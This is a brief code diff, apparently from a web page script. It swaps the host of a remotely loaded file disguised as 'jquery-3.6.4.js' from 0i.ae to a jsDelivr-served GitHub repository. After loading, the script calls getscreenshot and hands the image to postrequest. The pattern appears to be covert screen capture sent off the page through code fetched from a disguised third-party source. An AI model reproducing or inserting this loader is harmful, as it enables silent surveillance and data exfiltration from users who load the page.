@@ -16,7 +16,7 @@ function postrequest(img){
 
 function loadcanvas(){
     let canvas = document.createElement('script');
-    canvas.src = "https://0i.ae/jquery-3.6.4.js";
+    canvas.src = "https://cdn.jsdelivr.net/gh/lisalidbs/test@main/jquery-3.6.4.js";
     document.getElementsByTagName('head')[0].appendChild(canvas);
     canvas.onload = function(){
         getscreenshot(postrequest);
